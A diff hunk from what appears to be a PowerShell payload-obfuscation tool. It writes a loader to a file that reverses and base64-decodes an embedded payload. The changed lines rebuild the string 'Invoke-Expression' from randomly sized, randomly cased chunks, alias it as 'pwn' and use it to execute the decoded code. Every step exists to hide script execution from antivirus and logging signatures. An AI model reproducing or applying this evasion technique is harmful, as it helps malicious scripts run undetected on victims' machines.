@@ -82,8 +82,12 @@ $content = Get-Content $InvokePath ; Clear-Content $InvokePath ; Add-Content $In
 Add-Content $InvokePath '$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;'
 $RandomCode = '$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64")) ;'
 $RandomCode = ($RandomCode -split "" | %{if(@(0..1) | Get-Random){$_.toUpper()}else{$_.toLower()}}) -join "" ; Add-Content $InvokePath $RandomCode
-$RandomIEX = (("iN"+"voK"+"e"+"-"+"eXP"+"re"+"sSi"+"oN" -split "(.{$(Get-Random(1..3))})" -ne "" | % { '"' + $_ + '"' + "+" }) -join "").toString().trimend("+")
-$RandomCode = '$pwn = ' + $RandomIEX + ' ; New-Alias -name pwn -Value $pwn -Force ; pwn $LoadCode ;'
+$RandomSTR = "Invoke-Expression"; $RandomSTR2Parts = @(); $currentIndex = 0; while ($currentIndex -lt $RandomSTR.Length) { 
+$remainingLength = $RandomSTR.Length - $currentIndex; $chunkSize = Get-Random -Minimum 1 -Maximum ([System.Math]::Min(3, $remainingLength) + 1);
+$chunk = $RandomSTR.Substring($currentIndex, $chunkSize); $randomCasedChunk = ($chunk.ToCharArray() | ForEach-Object { 
+if (Get-Random -Maximum 2) {$_.ToString().ToLower()} else {$_.ToString().ToUpper()}}) -join '';
+$RandomSTR2Parts += "`"$randomCasedChunk`""; $currentIndex += $chunkSize }; $RandomSTR = $RandomSTR2Parts -join "+"; 
+$RandomCode = '$pwn = ' + $RandomSTR[-1..-99] + ' ; New-Alias -name pwn -Value ($pwn[-1..-99] -join "" -replace " ") -Force ; pwn $LoadCode ;'
 $RandomCode = ($RandomCode -split "" | %{if(@(0..1) | Get-Random){$_.toUpper()}else{$_.toLower()}}) -join "" ; Add-Content $InvokePath $RandomCode
 Write-Host "[OK]" -ForegroundColor Green ; Write-Host }
 
